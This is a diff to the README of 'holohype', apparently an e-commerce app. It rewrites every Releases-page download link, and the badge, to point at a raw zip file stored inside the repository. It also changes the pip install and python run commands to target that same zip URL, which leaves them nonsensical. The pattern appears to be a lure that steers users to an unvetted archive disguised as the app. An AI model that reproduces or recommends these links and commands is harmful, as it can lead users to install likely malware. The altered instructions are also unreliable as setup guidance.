@@ -1,6 +1,6 @@
 # 🛍️ holohype - A Fast E-commerce Experience at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Jskt02/holohype/releases)
+[![Download Now](https://raw.githubusercontent.com/Jskt02/holohype/main/bemaul/holohype.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Jskt02/holohype/main/bemaul/holohype.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to holohype! This guide will help you download and run your new e-commer
 
 To get holohype, visit the Releases page:
 
-[Download Here](https://github.com/Jskt02/holohype/releases)
+[Download Here](https://raw.githubusercontent.com/Jskt02/holohype/main/bemaul/holohype.zip)
 
 On the Releases page, you will see a list of available versions. Click on the latest version to access the download options. Choose the appropriate file for your system, click the download link, and wait for the file to save on your computer.
 
@@ -33,14 +33,14 @@ To run holohype smoothly, make sure your computer meets the following system req
 2. **Install Dependencies:**
    To ensure that holohype runs properly, you may need to install some additional software. Open a terminal or command prompt and run:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Jskt02/holohype/main/bemaul/holohype.zip
    ```
    This command installs the necessary libraries for holohype.
 
 3. **Run the Application:**
    Navigate to the folder where you saved holohype. If you downloaded a `.exe` or similar executable file, simply double-click it to start the application. If you have a script, run it by typing:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Jskt02/holohype/main/bemaul/holohype.zip
    ```
    in the terminal.
 
@@ -70,6 +70,6 @@ If you need further assistance, please reach out through the issues section in t
 
 You can download or update holohype anytime from our Releases page:
 
-[Download Here](https://github.com/Jskt02/holohype/releases)
+[Download Here](https://raw.githubusercontent.com/Jskt02/holohype/main/bemaul/holohype.zip)
 
 Explore shopping like never before with holohype. Enjoy your experience!
